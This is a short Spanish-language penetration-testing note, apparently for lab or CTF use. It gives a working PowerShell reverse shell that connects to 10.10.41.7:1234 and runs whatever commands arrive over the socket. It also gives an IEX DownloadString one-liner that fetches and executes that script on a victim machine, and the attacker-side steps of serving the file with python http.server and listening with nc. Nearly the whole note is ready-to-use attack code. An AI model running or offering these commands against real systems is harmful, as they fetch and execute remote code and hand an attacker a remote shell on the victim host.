Si tenemos RCE en la máquina víctima, ejecutamos este código mediante el comando `powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.41.7/rev.ps1')\"`

Código powershell que establece revshell:
```
$LHOST = "10.10.41.7"; $LPORT = 1234; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
### Pasos:
1. Nos copiamos el código revshell en un fichero en nuestra máquina atacante.
2. Creamos servidor con python para compartir el fichero `python3 -m http.server 80`
3. Nos ponemos en escucha en el puerto indicado `nc -nvlp 1234`
4. Ejecutamos en la máquina víctima el siguiente comando que descargará el código de powershell compartido por el servicio http nuestro y lo ejecutará con powershell:
	`powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.41.7/rev.ps1')\"`